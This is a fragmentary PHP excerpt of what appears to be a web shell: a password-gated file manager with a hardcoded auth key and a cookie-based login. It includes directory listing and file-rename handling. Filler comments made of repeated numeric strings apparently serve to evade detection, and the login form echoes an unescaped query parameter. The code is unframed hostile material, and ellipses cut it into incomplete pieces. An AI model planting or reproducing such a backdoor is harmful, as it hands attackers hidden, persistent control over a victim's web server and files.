...
$auth_key = "70b5bba66d36388d3368a1a4900fd932";
...
$pass = false;
if (isset($_COOKIE['pw_name_72731'])) {
    if(($_COOKIE['pw_name_72731']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_72731'])) {
        if(($_POST['pw_name_72731']) == $auth_key) {
            setcookie("pw_name_72731", $_POST['pw_name_72731']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_72731' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1725039659944805 1725039659552829 1725039659412453 1725039659686286
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1725039659944805 1725039659552829 1725039659412453 1725039659686286
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1725039659944805 1725039659552829 1725039659412453 1725039659686286
            $name = PATH . "/" . $_GET['r'];
